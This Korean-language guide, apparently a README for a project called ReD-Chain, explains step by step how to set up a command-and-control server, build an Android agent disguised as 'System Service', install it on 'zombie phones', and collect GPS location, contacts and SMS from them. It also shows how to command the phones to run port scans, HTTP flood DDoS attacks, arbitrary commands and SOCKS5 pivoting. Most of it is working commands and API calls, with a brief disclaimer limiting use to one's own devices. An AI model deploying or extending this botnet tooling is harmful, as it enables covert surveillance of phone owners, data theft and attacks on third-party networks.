# 사용 가이드 - C2와 좀비폰 연결하기

## 🎯 전체 흐름

```
[C2 서버 배포] → [앱 빌드] → [폰에 설치] → [자동 등록] → [Commander로 제어]
```

---

## 1️⃣ C2 서버 배포

### AWS EC2 배포 (권장)

```bash
# 1. EC2 인스턴스 생성
# - Ubuntu 22.04 LTS
# - t2.medium 이상
# - Security Group: 포트 8000, 22 열기

# 2. EC2 접속
ssh -i "your-key.pem" ubuntu@your-ec2-ip

# 3. Docker 설치
sudo apt update
sudo apt install docker.io docker-compose git -y
sudo usermod -aG docker ubuntu
exit

# 4. 다시 접속하여 프로젝트 설정
ssh -i "your-key.pem" ubuntu@your-ec2-ip
git clone https://github.com/HOHK0923/ReD-Chain.git
cd ReD-Chain/c2-server

# 5. 환경 변수 설정
cp .env.example .env
nano .env

# 필수 변경사항:
SECRET_KEY=<랜덤 문자열 64자>
API_KEY_SALT=<랜덤 문자열 64자>

# 6. 서버 실행
docker-compose up -d

# 7. 확인
curl http://localhost:8000/health
# 응답: {"status":"healthy"}
```

**중요: EC2 Public IP 기억하기!**
예: `54.123.45.67`

---

## 2️⃣ 안드로이드 앱 빌드

### C2 서버 주소 설정

```bash
cd ReD-Chain/android-agent
```

**파일 수정:**
`app/src/main/java/com/redchain/agent/network/C2Client.kt`

```kotlin
// 이 부분을 찾아서
private val baseUrl = "http://10.0.2.2:8000"

// EC2 Public IP로 변경 (또는 도메인)
private val baseUrl = "http://54.123.45.67:8000"
```

### Android Studio로 빌드

```bash
# 1. Android Studio 실행
# 2. "Open Project" → android-agent 폴더 선택
# 3. Gradle 동기화 대기
# 4. Build → Build Bundle(s) / APK(s) → Build APK(s)

# APK 위치:
# app/build/outputs/apk/debug/app-debug.apk
```

### 명령줄로 빌드

```bash
cd android-agent
./gradlew assembleDebug

# APK 생성됨:
# app/build/outputs/apk/debug/app-debug.apk
```

---

## 3️⃣ 핸드폰에 설치

### USB로 설치

```bash
# 1. 개발자 옵션 활성화
# 설정 → 휴대전화 정보 → 빌드 번호 7번 탭

# 2. USB 디버깅 활성화
# 설정 → 개발자 옵션 → USB 디버깅

# 3. PC에 연결 후
adb devices
# 디바이스가 보이는지 확인

adb install app/build/outputs/apk/debug/app-debug.apk
```

### 수동 설치

```bash
# APK를 핸드폰으로 복사
# 파일 매니저에서 APK 실행
# "알 수 없는 출처" 허용 필요
```

---

## 4️⃣ 앱 실행 및 자동 등록

### 첫 실행

```
1. 앱 아이콘 터치 ("System Service")
2. "Start Service" 버튼 클릭
3. 필요한 권한 허용:
   - 인터넷 (자동)
   - 위치 (GPS 추적용)
   - 연락처 (데이터 수집용)
   - SMS (메시지 수집용)
4. 백그라운드로 전환
```

### 자동 등록 확인

앱이 자동으로:
1. C2 서버에 등록 요청
2. API Key 받아서 저장
3. WebSocket 연결
4. Heartbeat 시작 (30초마다)

**C2 서버 로그에서 확인:**

```bash
# EC2에서
docker-compose logs -f c2-server

# 출력 예시:
# Node registered: node_id=abc123...
# WebSocket connected: abc123...
```

---

## 5️⃣ CLI Commander로 제어

### Commander 실행

```bash
# 로컬 PC에서
cd c2-server/cli
pip install -r requirements.txt

# C2 서버 URL 수정 (필요시)
# commander.py 파일에서 base_url 변경

python3 commander.py
```

### Commander 메뉴

```
═══════════════════════════════════════
   ReD-Chain C2 Commander
   Zombie Phone Control Center
═══════════════════════════════════════

1. 📱 View Nodes
2. 📋 View Tasks
3. 🎯 Port Scan Attack
4. 🌐 HTTP Flood (DDoS)
5. 🔍 DNS Lookup
6. 🌊 Traffic Generation
7. 🔗 Proxy Chain Test
8. 💾 Execute Custom Command
9. 🔄 Update Node Status
0. 🚪 Exit
```

---

## 6️⃣ 실전 사용 예시

### 예시 1: 분산 포트 스캔

```bash
# Commander 실행 후
선택: 3 (Port Scan Attack)

Target IP/Domain: 192.168.1.1
Port range: 1-1000
Broadcast to ALL nodes? Yes

→ 모든 좀비폰이 동시에 192.168.1.1:1-1000 스캔
→ 결과는 C2 서버에 자동 집계
```

### 예시 2: HTTP Flood 공격

```bash
선택: 4 (HTTP Flood)

Target URL: http://test-server.com
Duration: 60 (초)
Requests per second: 10
Broadcast: Yes

→ 10대 좀비폰 × 10 req/s × 60초 = 6,000 requests
```

### 예시 3: 특정 폰에만 명령

```bash
선택: 8 (Execute Custom Command)

Command: cat /proc/cpuinfo
Broadcast: No

Enter node IDs: abc123, def456

→ abc123, def456 두 폰에서만 명령 실행
```

---

## 7️⃣ 고급 기능

### Geolocation Tracking

```python
# Python으로 직접 API 호출
import requests

# 위치 추적 시작
response = requests.post(
    "http://54.123.45.67:8000/api/tasks/",
    json={
        "task_type": "custom",
        "parameters": {"action": "start_location_tracking"},
        "assigned_node_id": "abc123..."
    }
)

# 나중에 위치 히스토리 조회
response = requests.post(
    "http://54.123.45.67:8000/api/tasks/",
    json={
        "task_type": "custom",
        "parameters": {"action": "get_location_history"},
        "assigned_node_id": "abc123..."
    }
)
```

### SOCKS5 Proxy로 피버팅

```python
# SOCKS5 프록시 시작
requests.post(
    "http://54.123.45.67:8000/api/tasks/",
    json={
        "task_type": "custom",
        "parameters": {
            "action": "start_socks5",
            "port": 1080
        },
        "assigned_node_id": "abc123..."
    }
)

# 이제 핸드폰을 프록시로 사용 가능
# 핸드폰 IP:1080 으로 SOCKS5 연결
```

### Task Scheduling

```python
from datetime import datetime, timedelta

# 매일 오전 9시에 포트스캔
schedule_time = datetime.now().replace(hour=9, minute=0)

requests.post(
    "http://54.123.45.67:8000/api/scheduler/schedule",
    json={
        "task_type": "port_scan",
        "parameters": {
            "target": "192.168.1.0/24",
            "start_port": 1,
            "end_port": 1000
        },
        "schedule_time": schedule_time.isoformat(),
        "recurrence": True,
        "interval_seconds": 86400  # 24시간
    }
)
```

---

## 8️⃣ 모니터링

### 노드 상태 확인

```bash
# API로 확인
curl http://54.123.45.67:8000/api/nodes/

# 또는 Commander에서
선택: 1 (View Nodes)
```

### 작업 결과 확인

```bash
# Commander에서
선택: 2 (View Tasks)

# 또는 API로
curl http://54.123.45.67:8000/api/tasks/
```

### 통계 확인

```bash
curl http://54.123.45.67:8000/api/stats/overview

# 출력 예시:
{
  "total_nodes": 10,
  "total_tasks": 234,
  "nodes_by_status": {
    "online": 8,
    "offline": 2
  },
  "tasks_by_status": {
    "completed": 200,
    "running": 10,
    "pending": 24
  }
}
```

---

## 9️⃣ 문제 해결

### 핸드폰이 C2에 연결 안 됨

```bash
# 1. C2 서버 확인
curl http://54.123.45.67:8000/health

# 2. 방화벽 확인
# EC2 Security Group에서 포트 8000 열려있는지

# 3. 앱 로그 확인
adb logcat | grep "C2Client"

# 4. C2 URL 재확인
# C2Client.kt 파일의 baseUrl이 맞는지
```

### Heartbeat 끊김

```
원인: 안드로이드 배터리 최적화
해결:
1. 설정 → 배터리 → 배터리 최적화
2. "System Service" 앱 찾기
3. "최적화 안 함" 선택
```

### Permission 오류

```
오류: Location permission denied

해결:
1. 설정 → 앱 → System Service
2. 권한 → 위치 → "항상 허용"
3. 백그라운드 위치 접근 허용
```

---

## 🔟 보안 주의사항

### 프로덕션 환경

```bash
# 1. HTTPS 사용 (Let's Encrypt)
# 2. 강력한 SECRET_KEY 사용
# 3. 방화벽 설정
# 4. API Rate Limiting
# 5. 로그 모니터링
```

### 안전한 테스트

```
✅ 본인 소유 디바이스만
✅ 격리된 네트워크에서 테스트
✅ 민감한 데이터 수집 시 암호화
✅ 테스트 후 데이터 삭제
❌ 타인 네트워크 스캔 금지
❌ 무단 공격 금지
```

---

## 📞 문제 발생 시

1. GitHub Issues: https://github.com/HOHK0923/ReD-Chain/issues
2. 로그 확인:
   - C2: `docker-compose logs -f`
   - Android: `adb logcat`
3. API 문서: http://your-c2:8000/docs

---

**완료!** 이제 좀비폰 인프라가 작동합니다! 🚀
